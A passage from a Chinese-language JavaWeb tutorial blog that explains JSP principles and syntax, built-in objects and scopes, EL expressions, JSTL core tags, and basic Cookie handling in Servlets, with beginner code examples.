punctuation">)</span><span class="token punctuation">;</span>        writer<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"&lt;head>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        writer<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>"<span class="token operator">&lt;</span>meta http<span class="token operator">-</span>equiv<span class="token operator">=</span>\"Content<span class="token operator">-</span>Type\" content<span class="token operator">=</span>\"text<span class="token operator">/</span>html<span class="token punctuation">;</span>                charset<span class="token operator">=</span>UTF<span class="token operator">-</span><span class="token number">8</span>\<span class="token string">">"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        writer<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"&lt;title>Insert title here&lt;/title>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        writer<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"&lt;/head>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        writer<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"&lt;body>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        writer<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"这是由 Servlet 程序输出的 html 页面内容！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        writer<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"&lt;/body>&lt;/html>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>上面的代码我们不难发现。通过 Servlet 输出简单的 html 页面信息都非常不方便。 </code></p><p><code>那我们要输出一个复杂页面的时候，就更加的困难，而且不利于页面的维护和调试。 </code></p><p><code>所以 sun 公司推出一种叫做 jsp 的动态页面技术帮助我们实现对页面的输出繁锁工作。 </code></p><p><strong><code>jsp 页面的访问千万不能像 HTML 页面一样。托到浏览器中。只能通过浏览器访问 Tomcat 服务器再访问 jsp 页面</code></strong></p><h3 id="jsp-的运行原理"><a href="#jsp-的运行原理" class="headerlink" title="jsp 的运行原理"></a>jsp 的运行原理</h3><p>jsp 的运行原理（要求知道）</p><p><em><strong>jsp 的本质 ，其实是一个 Servlet 程序。</strong></em></p><p><img src="/2021/11/30/javaWeb/image-20211127155806890.png" alt="image-20211127155806890"></p><p>a.jsp 翻译成 java 文件后的全名是 a_jsp.java 文件</p><p> b.jsp 翻译成 java 文件后的全名是 b_jsp.java 文件 </p><p>那么 当我们访问 一个 xxx.jsp 文件后 翻译成 java 文件的全名是 xxx_jsp.java 文件 xxx_jsp.java 文件是一个 Servlet 程序。</p><p>原来 jsp 中的 html 内容都被翻译到 Servlet 类的 service 方法中原样输出。</p><h3 id="jsp-的语法"><a href="#jsp-的语法" class="headerlink" title="jsp 的语法"></a>jsp 的语法</h3><h4 id="jsp-文件头部声明介绍（page-指令介绍）"><a href="#jsp-文件头部声明介绍（page-指令介绍）" class="headerlink" title="jsp 文件头部声明介绍（page 指令介绍）"></a>jsp 文件头部声明介绍（page 指令介绍）</h4><pre class="line-numbers language-jsp"><code class="language-jsp"><%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8" %><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​    这是 jsp 文件的头声明。表示这是 jsp 页面。<br>​    <strong>language 属性 值只能是 java。     表示翻译的得到的是 java 语言的</strong><br>​    <strong>contentType 属性                        设置响应头 contentType 的内容</strong><br>​    <strong>pageEncoding 属性    设置当前 jsp 页面的编码</strong><br>​<strong>import 属性 给当前 jsp 页面导入需要使用的类包</strong><br>​    <strong>autoFlush 属性  设置是否自动刷新 out 的缓冲区，默认为 true</strong><br>​    <strong>buffer 属性 设置 out 的缓冲区大小。默认为 8KB</strong><br>​    <strong>errorPage 属性 设置当前 jsp 发生错误后，需要跳转到哪个页面去显示错误信息</strong><br>​    <strong>isErrorPage 属性  设置当前 jsp 页面是否是错误页面。是的话，就可以使用 exception 异常对象</strong><br>​    <strong>session 属性     设置当前 jsp 页面是否获取 session 对象,默认为 true</strong><br>​    <strong>extends 属性       给服务器厂商预留的 jsp 默认翻译的 servlet 继承于什么</strong></p><h4 id="jsp-中的三种脚本介"><a href="#jsp-中的三种脚本介" class="headerlink" title="jsp 中的三种脚本介"></a>jsp 中的三种脚本介</h4><h5 id="声明脚本"><a href="#声明脚本" class="headerlink" title="声明脚本"></a>声明脚本</h5><p><img src="/2021/11/30/javaWeb/image-20211127155858140.png" alt="image-20211127155858140"></p><p><img src="/2021/11/30/javaWeb/image-20211127155920874.png" alt="image-20211127155920874"></p><pre class="line-numbers language-jsp"><code class="language-jsp"><!--声明类的属性--><%!    private Integer id;    private String name;    private static Map<String,Object> map = new HashMap<>();%><%!    //声明 static 静态代码块    static {        map.put("key1",1);        map.put("key2",2);        map.put("key3",3);        map.put("key4",4);    }%><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="表达式脚本"><a href="#表达式脚本" class="headerlink" title="表达式脚本"></a>表达式脚本</h5><p><img src="/2021/11/30/javaWeb/image-20211127160145501.png" alt="image-20211127160145501"></p><p><img src="/2021/11/30/javaWeb/image-20211127160200546.png" alt="image-20211127160200546"></p><pre class="line-numbers language-jsp"><code class="language-jsp"><%=12 %><br><%=12.12 %><br><%="我是字符串" %><br><%=map %><br><%=request.getParameter("username") %><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="代码脚本"><a href="#代码脚本" class="headerlink" title="代码脚本"></a>代码脚本</h5><p><img src="/2021/11/30/javaWeb/image-20211127160222231.png" alt="image-20211127160222231"></p><p><img src="/2021/11/30/javaWeb/image-20211127160237867.png" alt="image-20211127160237867"></p><pre class="line-numbers language-jsp"><code class="language-jsp"><%    int i =12;    if (i == 12){        System.out.println("好厉害" );    }else {        System.out.println("家的啊");    }%><%    for (int i1 = 0; i1 < 10; i1++) {        System.out.println(i1);    }%><%    String username = request.getParameter("username");    System.out.println(username);%><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>打印表格：</p><pre class="line-numbers language-jsp"><code class="language-jsp"><table border="1" cellspacing="0"><%    for (int i1 = 0; i1 < 10; i1++) {        %>    <th>第<br><%=i1 + 1 %>行</th><%    System.out.println(i1);    }%></table><%--这是翻译后的代码--%>    for (int i1 = 0 ; i1 < 10 ; i1 ++){            System.out.println(i1);                   }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看出这种写法相当繁琐，因此后面我们会学到EL表达式。</p><h3 id="jsp-九大内置对象"><a href="#jsp-九大内置对象" class="headerlink" title="jsp 九大内置对象"></a>jsp 九大内置对象</h3><p><strong>request 对象 请求对象，可以获取请求信息</strong> </p><p><strong>response 对象 响应对象。可以设置响应信息</strong> </p><p><strong>pageContext 对象 当前页面上下文对象。可以在当前上下文保存属性信息</strong> </p><p><strong>session 对象 会话对象。可以获取会话信息。</strong> </p><p><strong>exception 对象 异常对象只有在 jsp 页面的</strong> </p><p><strong>page 指令中设置 isErrorPage=”true” 的时候才会存在 application 对象</strong> </p><p><strong>ServletContext 对象实例，可以获取整个工程的一些信息。</strong> </p><p><strong>config 对象 ServletConfig 对象实例，可以获取 Servlet 的配置信息 out 对象 输出流。</strong></p><p> <strong>page 对象 表示当前 Servlet 对象实例（无用，用它不如使用 this</strong></p><p><img src="/2021/11/30/javaWeb/image-20211127160404916.png" alt="image-20211127160404916"></p><p>九大内置对象，都是我们可以在【代码脚本】中或【表达式脚本】中直接使用的对 象。</p><h3 id="jsp-四大域对象"><a href="#jsp-四大域对象" class="headerlink" title="jsp 四大域对象"></a>jsp 四大域对象</h3><p>​<strong>四大域对象经常用来保存数据信息。</strong></p><p>pageContext 可以保存数据在同一个 jsp 页面中使用 </p><p>request 可以保存数据在同一个 request 对象中使用。经常用于在转发的时候传递数据 </p><p>session 可以保存在一个会话中使用 </p><p>application(ServletContext) 就是 ServletContext 对象，工程创建时创建，工程关闭时销毁。 （可以）</p><p><em><strong>它们从小到大的顺序分别是：pageContext 、Request、Session 、application</strong></em></p><p><em><strong>使用的优先顺序是从小到大：pageContext 、Request、Session 、application</strong></em></p><h3 id="jsp-的常用标签"><a href="#jsp-的常用标签" class="headerlink" title="jsp 的常用标签"></a>jsp 的常用标签</h3><p><strong>&lt;%– 静态包含 –%&gt;</strong> </p><p><strong>&lt;%– 动态包含 –%&gt;</strong> </p><p><strong>&lt;%– 转发 –%&gt;</strong></p><h4 id="1）静态包含–很常用"><a href="#1）静态包含–很常用" class="headerlink" title="1）静态包含–很常用"></a>1）静态包含–很常用</h4><p><strong>&lt;%@ include file=”” %&gt;</strong></p><p> 静态包含是把包含的页面内容原封装不动的输出到包含的位置。**</p><h4 id="2）动态包含–很少用"><a href="#2）动态包含–很少用" class="headerlink" title="2）动态包含–很少用"></a>2）动态包含–很少用</h4><p><strong>&lt;jsp:include page=””&gt;&lt; /jsp:include&gt;</strong></p><p>动态包含会把包含的 jsp 页面单独翻译成 servlet 文件，然后在执行到时候再调用翻译的 servlet 程序。并把 计算的结果返回。 动态包含是在执行的时候，才会加载。所以叫动态包含。</p><h4 id="3）页面转发–常用"><a href="#3）页面转发–常用" class="headerlink" title="3）页面转发–常用"></a>3）页面转发–常用</h4><p>&lt;jsp:forward page=””&gt; &lt; /jsp:forward&gt;<br>&lt; jsp:forward&gt; 转发功能相当于<br>request.getRequestDispatcher(“/xxxx.jsp”).forward(request, response); 功能</p><p><img src="/2021/11/30/javaWeb/image-20211127160758099.png" alt="image-20211127160758099"></p><p>把学生信息输出在表格：</p><pre class="line-numbers language-jsp"><code class="language-jsp"><table >    <tr>        <td>编号</td>        <td>姓名</td>        <td>年龄</td>        <td>电话</td>    </tr><%    for (Student student : list){        %>    <tr>        <td><%=student.getId()%></td>        <td><%=student.getName()%></td>        <td><%=student.getAge()%></td>        <td><%=student.getPhone()%></td>    </tr>    <%    }%></table><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ServletContextListener-监听"><a href="#ServletContextListener-监听" class="headerlink" title="ServletContextListener 监听"></a>ServletContextListener 监听</h2><p><img src="/2021/11/30/javaWeb/image-20211127160838300.png" alt="image-20211127160838300"></p><p><img src="/2021/11/30/javaWeb/image-20211127160909637.png" alt="image-20211127160909637"></p><p><img src="/2021/11/30/javaWeb/image-20211127161114817.png" alt="image-20211127161114817"></p><h2 id="EL-表达式-amp-JSTL-标签库"><a href="#EL-表达式-amp-JSTL-标签库" class="headerlink" title="EL 表达式 &amp; JSTL 标签库"></a>EL 表达式 &amp; JSTL 标签库</h2><h3 id="EL表达式"><a href="#EL表达式" class="headerlink" title="EL表达式"></a>EL表达式</h3><pre><code>EL 表达式的全称是：Expression Language。是表达式语言。EL 表达式的什么作用：EL 表达式主要是代替 jsp 页面中的表达式脚本在 jsp 页面中进行数据的输出。因为 EL 表达式在输出数据的时候，要比 jsp 的表达式脚本要简洁很多</code></pre><pre class="line-numbers language-jsp"><code class="language-jsp"><%    request.setAttribute("key","key1");%>表达式脚本输出: <%=request.getAttribute("key1")%><br/>EL表达式输出: ${key1}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/11/30/javaWeb/image-20211127161237588.png" alt="image-20211127161237588"></p><h4 id="EL-表达式搜索域数据的顺序"><a href="#EL-表达式搜索域数据的顺序" class="headerlink" title="EL 表达式搜索域数据的顺序"></a>EL 表达式搜索域数据的顺序</h4><p>EL 表达式主要是在 jsp 页面中输出数据。<br>主要是输出域对象中的数据。<br>当四个域中都有相同的 key 的数据的时候，EL 表达式会按照四个域的从小到大的顺序去进行搜索，找到就输出.</p><p>为了避免这样的情况，可以设置不同名字的Key</p><pre class="line-numbers language-jsp"><code class="language-jsp"><%    pageContext.setAttribute("key","pageContext");    request.setAttribute("key","request");    session.setAttribute("key","session");    application.setAttribute("key","application");%>${key} //输出pageContext<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="EL-表达式输出-Bean-的普通属性，数组属性。List-集-合属性，map-集合属性"><a href="#EL-表达式输出-Bean-的普通属性，数组属性。List-集-合属性，map-集合属性" class="headerlink" title="EL 表达式输出 Bean 的普通属性，数组属性。List 集 合属性，map 集合属性"></a>EL 表达式输出 Bean 的普通属性，数组属性。List 集 合属性，map 集合属性</h4><pre class="line-numbers language-jsp"><code class="language-jsp"><%    Person person = new Person();    person.setName("tom");    person.setPhones(new String[]{"186515151","156295654","123521888"});    ArrayList<String> cities = new ArrayList<>();    cities.add("北京");    cities.add("南京");    cities.add("上海");    cities.add("深圳");    person.setCities(cities);    Map<String,Object> map = new HashMap<>();    map.put("key1","values1");    map.put("key2","values2");    map.put("key3","values3");    map.put("key4","values4");    map.put("key5","values5");    person.setMap(map);    pageContext.setAttribute("person",person);%>输出person的属性:${person}<br/>输出person的name属性: ${person.name}<br/>输出person的phones1数组属性: ${person.phones[0]}<br/>输出person的phones2数组属性: ${person.phones[1]}<br/>输出person的phones3数组属性: ${person.phones[2]}<br/>输出person的cities集合1的属性: ${person.cities[0]}<br/>输出person的cities集合2的属性: ${person.cities[1]}<br/>输出person的map集合的属性: ${person.map}<br/>输出person的map集合1的属性: ${person.map.key2}<br/><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>EL表达式之所以能够输出Bean中的属性，是因为它调用了get方法，当Bean中没有get方法的时候，就没办法获取Bean中的属性了</strong></p><h4 id="EL-表达式——运算"><a href="#EL-表达式——运算" class="headerlink" title="EL 表达式——运算"></a>EL 表达式——运算</h4><p><img src="/2021/11/30/javaWeb/image-20211127161553847.png" alt="image-20211127161553847"></p><p><img src="/2021/11/30/javaWeb/image-20211127161607808.png" alt="image-20211127161607808"></p><p><img src="/2021/11/30/javaWeb/image-20211127161644440.png" alt="image-20211127161644440"></p><p><img src="/2021/11/30/javaWeb/image-20211127161658292.png" alt="image-20211127161658292"></p><h4 id="EL-表达式的-11-个隐含对象"><a href="#EL-表达式的-11-个隐含对象" class="headerlink" title="EL 表达式的 11 个隐含对象"></a>EL 表达式的 11 个隐含对象</h4><p><img src="/2021/11/30/javaWeb/image-20211127161720290.png" alt="image-20211127161720290"></p><h4 id="EL-获取四个特定域中的属性"><a href="#EL-获取四个特定域中的属性" class="headerlink" title="EL 获取四个特定域中的属性"></a>EL 获取四个特定域中的属性</h4><pre><code>pageScope ====== pageContext 域requestScope ====== Request 域sessionScope ====== Session 域applicationScope ====== ServletContext 域</code></pre><pre class="line-numbers language-jsp"><code class="language-jsp"><body><%    pageContext.setAttribute("key1", "pageContext1");    pageContext.setAttribute("key2", "pageContext2");    request.setAttribute("key2", "request");    session.setAttribute("key2", "session");    application.setAttribute("key2", "application");%>${ applicationScope.key2 }</body><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="pageContext-对象的使用"><a href="#pageContext-对象的使用" class="headerlink" title="pageContext 对象的使用"></a>pageContext 对象的使用</h4><pre class="line-numbers language-jsp"><code class="language-jsp"><body><%--    ${pageContext}--%>    <%=request.getScheme()%> <br/>    1.协议： ${pageContext.request.scheme} <br/>    2.服务器ip: ${pageContext.request.serverName}<br/>    3.服务器端口号 : ${pageContext.request.serverPort}<br/>    4.获取工程路径： ${pageContext.request.contextPath}<br/>    5.获取请求的方法: ${pageContext.request.method}<br/>    6.获取客户端IP: ${pageContext.request.remoteHost}<br/>    7.获取会话的id: ${pageContext.session.id}<br/></body><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/11/30/javaWeb/image-20211127161904610.png" alt="image-20211127161904610"></p><p><img src="/2021/11/30/javaWeb/image-20211127161928994.png" alt="image-20211127161928994"></p><pre class="line-numbers language-jsp"><code class="language-jsp"><body>    ${param['username']}<br/>    ${param.password}<br/>    ${paramValues.username[0]}<br/>    ${paramValues.password[0]}<br/>    ${paramValues.hobby[0]}<br/>    ${paramValues.hobby[1]}<br/>    ${paramValues.hobby[2]}<br/>    <hr>    accept的值： ${header.accept}<br>    <hr>    accept的值： ${headerValues['accept'][0]}<br/>    <hr>    cookie名称: ${cookie.JSESSIONID['name']}<br/>    cookie的值： ${cookie.JSESSIONID['value']} <br/>    <hr>    输出&lt;Context-param&gt; username的值${initParam.username}<br/>    输出&lt;Context-param&gt; url的值${initParam.url}<br/></body><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="JSTL-标签库"><a href="#JSTL-标签库" class="headerlink" title="JSTL 标签库"></a>JSTL 标签库</h3><pre><code>JSTL 标签库 全称是指 JSP Standard Tag Library JSP 标准标签库。是一个不断完善的开放源代码的 JSP 标签库。</code></pre><p><strong>EL 表达式主要是为了替换 jsp 中的表达式脚本，而标签库则是为了替换代码脚本。这样使得整个 jsp 页面变得更佳简洁。</strong></p><p><img src="/2021/11/30/javaWeb/image-20211127202333153.png" alt="image-20211127202333153"></p><pre class="line-numbers language-jsp"><code class="language-jsp">在 jsp 标签库中使用 taglib 指令引入标签库CORE 标签库<%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core" %>XML 标签库<%@ taglib prefix="x" uri="http://java.sun.com/jsp/jstl/xml" %>FMT 标签库<%@ taglib prefix="fmt" uri="http://java.sun.com/jsp/jstl/fmt" %>SQL 标签库<%@ taglib prefix="sql" uri="http://java.sun.com/jsp/jstl/sql" %>FUNCTIONS 标签库<%@ taglib prefix="fn" uri="http://java.sun.com/jsp/jstl/functions" %><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="JSTL-标签库的使用步骤"><a href="#JSTL-标签库的使用步骤" class="headerlink" title="JSTL 标签库的使用步骤"></a>JSTL 标签库的使用步骤</h4><p>链接：<a href="https://pan.baidu.com/s/11mlCO8y4yslPvCD0YjhaOA">https://pan.baidu.com/s/11mlCO8y4yslPvCD0YjhaOA</a>  提取码：love </p><p><img src="/2021/11/30/javaWeb/image-20211127202433125.png" alt="image-20211127202433125"></p><h4 id="core-核心库使用"><a href="#core-核心库使用" class="headerlink" title="core 核心库使用"></a>core 核心库使用</h4><h5 id="i-lt-c-set-x2F-gt-（很少使用）"><a href="#i-lt-c-set-x2F-gt-（很少使用）" class="headerlink" title="i.    < c:set/>（很少使用）"></a>i.    &lt; c:set/&gt;（很少使用）</h5><p>作用：set 标签可以往域中保存数据</p><pre class="line-numbers language-jsp"><code class="language-jsp"><%--i.<c:set />作用：set 标签可以往域中保存数据域对象.setAttribute(key,value);scope 属性设置保存到哪个域page 表示 PageContext 域（默认值）request 表示 Request 域session 表示 Session 域application 表示 ServletContext 域var 属性设置 key 是多少value 属性设置值--%>保存之前：${ sessionScope.abc } <br><c:set scope="session" var="abc" value="abcValue"/>保存之后：${ sessionScope.abc } <br><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="ii-lt-c-if-x2F-gt"><a href="#ii-lt-c-if-x2F-gt" class="headerlink" title="ii. < c:if/>"></a>ii. &lt; c:if/&gt;</h5><p>if 标签用来做 if 判断。</p><pre class="line-numbers language-jsp"><code class="language-jsp"><%--if 标签用来做 if 判断。test 属性表示判断的条件（使用 EL 表达式输出）--%><c:if test="${ 12 == 12 }">    <h1>12 等于 12</h1></c:if><c:if test="${ 12 != 12 }">    <h1>12 不等于 12</h1></c:if><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="iii-lt-c-choose-gt-lt-c-when-gt-lt-c-otherwise-gt-标签"><a href="#iii-lt-c-choose-gt-lt-c-when-gt-lt-c-otherwise-gt-标签" class="headerlink" title="iii. < c:choose> < c:when> < c:otherwise>标签"></a>iii. &lt; c:choose&gt; &lt; c:when&gt; &lt; c:otherwise&gt;标签</h5><p><img src="/2021/11/30/javaWeb/image-20211127203012163.png" alt="image-20211127203012163"></p><pre class="line-numbers language-jsp"><code class="language-jsp"><%--iii.<c:choose> <c:when> <c:otherwise>标签作用：多路判断。跟 switch ... case .... default 非常接近choose 标签开始选择判断when 标签表示每一种判断情况test 属性表示当前这种判断情况的值otherwise 标签表示剩下的情况<c:choose> <c:when> <c:otherwise>标签使用时需要注意的点：1、标签里不能使用 html 注释，要使用 jsp 注释2、when 标签的父标签一定要是 choose 标签--%><%    request.setAttribute("height", 180);%><c:choose>    <%-- 这是 html 注释 --%>    <c:when test="${ requestScope.height > 190 }">        <h2>小巨人</h2>    </c:when>    <c:when test="${ requestScope.height > 180 }">        <h2>很高</h2>    </c:when>    <c:when test="${ requestScope.height > 170 }">        <h2>还可以</h2>    </c:when><c:otherwise>    <c:choose>        <c:when test="${requestScope.height > 160}">            <h3>大于 160</h3>        </c:when>        <c:when test="${requestScope.height > 150}">            <h3>大于 150</h3>        </c:when>        <c:when test="${requestScope.height > 140}">            <h3>大于 140</h3>        </c:when>        <c:otherwise>            其他小于 140        </c:otherwise>    </c:choose></c:otherwise></c:choose><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="iv-lt-c-forEach-x2F-gt"><a href="#iv-lt-c-forEach-x2F-gt" class="headerlink" title="iv.  < c:forEach  />"></a>iv.  &lt; c:forEach  /&gt;</h5><p><img src="/2021/11/30/javaWeb/image-20211127203129355.png" alt="image-20211127203129355"></p><ol><li>遍历 1-10</li></ol><pre class="line-numbers language-jsp"><code class="language-jsp"><%--遍历 1-10--%><table><c:forEach begin="1" end="10" var="i" >    <tr>        <td>第${ i }行<td/>    </tr></c:forEach></table><hr><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li>遍历 Object 数组</li></ol><pre class="line-numbers language-jsp"><code class="language-jsp"><%    request.setAttribute("arr",new String[]{"123321","2324122","121dcd"});%><c:forEach items="${requestScope.arr}"  var="item" >    ${ item }</c:forEach><hr/><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="3"><li>遍历 Map 集合</li></ol><pre class="line-numbers language-jsp"><code class="language-jsp"><%    Map<String,Object> map = new HashMap<>();    map.put("key1","value1");    map.put("key2","value2");    map.put("key3","value3");    map.put("key4","value4");    request.setAttribute("map",map);%><c:forEach items="${requestScope.map}" var="entry">    key:${entry.key} -> values: ${entry.value} <br/></c:forEach><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="4"><li><p>遍历对象</p><pre class="line-numbers language-jsp"><code class="language-jsp"><%--items 表示遍历的集合var 表示遍历到的数据begin 表示遍历的开始索引值end 表示结束的索引值step 属性表示遍历的步长值varStatus 属性表示当前遍历到的数据的状态for（int i = 1; i < 10; i+=2）--%><c:forEach begin="2" end="7" step="2" varStatus="status" items="${requestScope.stus}" var="stu">    <tr>        <td>${stu.id}</td>        <td>${stu.username}</td>        <td>${stu.password}</td>        <td>${stu.age}</td>        <td>${stu.phone}</td>        <td>${status.step}</td>    </tr></c:forEach><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><p><img src="/2021/11/30/javaWeb/image-20211127203221104.png" alt="image-20211127203221104"></p><p><strong>同理，JSTL的foreach也是通过bean的get方法，来获取对象的属性</strong></p><h3 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h3><h4 id="什么是-Cookie"><a href="#什么是-Cookie" class="headerlink" title="什么是 Cookie?"></a>什么是 Cookie?</h4><pre><code>1、Cookie 翻译过来是饼干的意思。2、Cookie 是服务器通知客户端保存键值对的一种技术。3、客户端有了 Cookie 后，每次请求都发送给服务器。4、每个 Cookie </code></pre><h4 id="如何创建-Cookie"><a href="#如何创建-Cookie" class="headerlink" title="如何创建 Cookie"></a>如何创建 Cookie</h4><p><img src="/2021/11/30/javaWeb/image-20211127203339854.png" alt="image-20211127203339854"></p><pre class="line-numbers language-java"><code class="language-java"><span class="token comment" spellcheck="true">//创建cookie对象</span>Cookie cookie <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Cookie</span><span class="token punctuation">(</span><span class="token string">"key1"</span><span class="token punctuation">,</span> <span class="token string">"value1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//通知客户端保存Cookie</span>response<span class="token punctuation">.</span><span class="token function">addCookie</span><span class="token punctuation">(</span>cookie<span class="token punctuation">)</span><span class="token punctuation">;</span>Cookie cookie1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Cookie</span><span class="token punctuation">(</span><span class="token string">"key2"</span><span class="token punctuation">,</span> <span class="token string">"value2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>response<span class="token punctuation">.</span><span class="token function">addCookie</span><span class="token punctuation">(</span>cookie1<span class="token punctuation">)</span><span class="token punctuation">;</span>response<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"cookie创建成功"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="服务器如何获取-Cookie"><a href="#服务器如何获取-Cookie" class="headerlink" title="服务器如何获取 Cookie"></a>服务器如何获取 Cookie</h4><p><img src="/2021/11/30/javaWeb/image-20211127203420723.png" alt="image-20211127203420723"></p><pre class="line-numbers language-java"><code class="language-java">Cookie<span class="token punctuation">[</span><span class="token punctuation">]</span> cookies <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getCookies</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Cookie iWantCookie <span class="token operator">=</span> null<span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span>Cookie cookie <span class="token operator">:</span> cookies<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//getName返回cookie的名称</span>    response<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"cookie["</span> <span class="token operator">+</span> cookie<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"]"</span> <span class="token operator">+</span> <span class="token string">"=["</span> <span class="token operator">+</span> cookie<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"]"</span> <span class="token operator">+</span> <span class="token string">"&lt;br/>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>iWantCookie <span class="token operator">=</span> CookieUtils<span class="token punctuation">.</span><span class="token function">findCookie</span><span class="token punctuation">(</span><span class="token string">"key1"</span><span class="token punctuation">,</span> cookies<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>iWantCookie <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>    response<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"找到了我们需要的cookie"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers 